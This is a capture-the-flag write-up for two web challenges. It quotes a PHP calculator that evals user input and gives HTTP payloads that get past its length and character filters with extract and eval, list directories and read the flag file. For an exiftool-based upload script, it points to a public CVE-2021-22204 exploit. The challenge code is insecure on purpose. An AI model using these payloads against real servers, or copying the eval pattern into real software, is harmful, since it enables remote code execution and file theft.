### Lame Calc (682 pts)

Given an attachment file index.php with this source code
```
<form action="/" method="POST">
   Enter your equation : <br>
   <input type="text" name="equation"><br>
   <input type="submit" name="submit" value="Submit">
</form>
 
<?php
if (isset($_POST["equation"])){
   $eq = $_POST["equation"];
 
   if (strlen($eq) > 57){
       die("Too long !");
   }
 
   if(preg_match("/\~|\&|\||\[|\]|\.|\`|\'|\||\+|\-|\>|\?|\<|\//i",$eq)){
       die("Bad Char !");
   }
   eval("echo " . $eq . " ;");
 
}
?>
```

From that source code, we know that our restriction is
1. Length our input must be under 57
2. We cant use `"~&|[].`'+-?<>\"`

After that our input will be evaluated by application.

Our next restriction is `disable_functions`. filesystem functions, shell functions, and phpinfo are restricted too.

#### Solving the Problem
1. Length Restriction.
We are still able to bypass length restriction using extract and evaluate it.
```
POST / HTTP/1.1
… < snip - snip > …

equation=@extract($_REQUEST);eval($c);&submit=Submit&c=scandir(".");
```
2. Alternative for directory listing.
Using class SPL (Standard PHP Library)
```
POST / HTTP/1.1
… < snip - snip > …

equation=@extract($_REQUEST);eval($c);&submit=Submit&c=$dir = new DirectoryIterator("/app/public/sik.ret");
foreach ($dir as $fileinfo) {
    if (!$fileinfo->isDot()) {
        var_dump($fileinfo->getFilename());
    }
}
```
3. Alternative for reading file
```
POST / HTTP/1.1
… < snip - snip > …

equation=@extract($_REQUEST);eval($c);&submit=Submit&c=include('/app/public/sik.ret/flag.txt)
```

### Blind Exi(t) (697 pts)
Given an attachment file upload.php with this source code
```
<?php
 
if($_POST['upload'] && $_POST["comment"]){
   $comment = $_POST["comment"];
   $allowed_ext = array('png','jpg','jpeg');
   $filename = $_FILES['file']['name'];
   $x = explode('.', $filename);
   $ext = strtolower(end($x));
   $size   = $_FILES['file']['size'];
   $file_tmp = $_FILES['file']['tmp_name'];
   $outfilename = "<REDACTED>";
   $outpath = 'uploads/'.$outfilename.".".$ext;
 
   if(in_array($ext, $allowed_ext) === true){
      
       if(mime_content_type($file_tmp) != "image/png" && mime_content_type($file_tmp) != "image/jpg" && mime_content_type($file_tmp) != "image/jpeg"){
           die("Only allowed image/jpg or image/png MIME type !");
       }
 
       if($size < 7000){          
           move_uploaded_file($file_tmp, $outpath);
 
           $check_cmd = escapeshellcmd("./exiftool $outpath");
           $write_cmd = escapeshellcmd("./exiftool -Comment='$comment' $outpath");
           shell_exec($check_cmd.";".$write_cmd);
 
           $image_info = getimagesize($outpath);
 
           header('Content-Type: ' . $image_info['mime']);
           header('Content-Length: ' . filesize($outpath));
 
           readfile($outpath);
 
       }else{
           die('Size too big !');
       }
   }else{
       die('Not allowed extension !') ;
   }
}
```
From that source code, we know that our restriction is
1. Our comment will be escaped using `escapeshellcmd()`
2. File must be a valid image
3. we cant control output filename

The recent exploit for exiftool is `CVE-2021-22204`

#### Solving The Problem
We just use this repository for solving this challenge.

https://github.com/convisoappsec/CVE-2021-22204-exiftool